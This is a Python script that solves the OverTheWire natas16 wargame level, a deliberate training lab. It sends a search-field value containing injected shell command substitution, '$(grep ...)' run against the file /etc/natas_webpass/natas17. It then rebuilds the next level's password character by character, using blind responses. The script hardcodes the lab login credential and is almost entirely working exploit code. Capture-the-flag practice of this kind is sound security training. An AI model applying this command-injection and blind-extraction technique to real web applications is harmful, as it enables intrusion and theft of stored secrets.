#!/usr/bin/env python
try:
    import requests, string, time
    timing1=float(time.asctime().split(' ')[3][-5:].replace(":","."))
    chars=string.ascii_letters+'0123456789'
    url='http://natas16.natas.labs.overthewire.org/index.php'
    pwd=' /etc/natas_webpass/natas17'
    password=""
    while len(password)!=32:       
        for i in chars:
            r=requests.post(url,data={'needle':'$(grep ^'+'.'*len(password)+i+pwd+')'},auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')).content
            content=r[r.index('<pre>\n')+6:r.index('</pre>')]
            if content=="":
                password+=i
                print(password)
                break
    print('-'*12+'Complete'+'-'*12+'\n')
    timing2=float(time.asctime().split(' ')[3][-5:].replace(":","."))
    if str(timing1)[0:2]==str(timing2)[0:2]: print('\nTime: '+str(timing2-timing1)+' min')
    else: print('\nTime: '+str(timing2-timing1-0.4)+' min')
    print('The password is '+password)
except(KeyboardInterrupt, EOFError): exit()
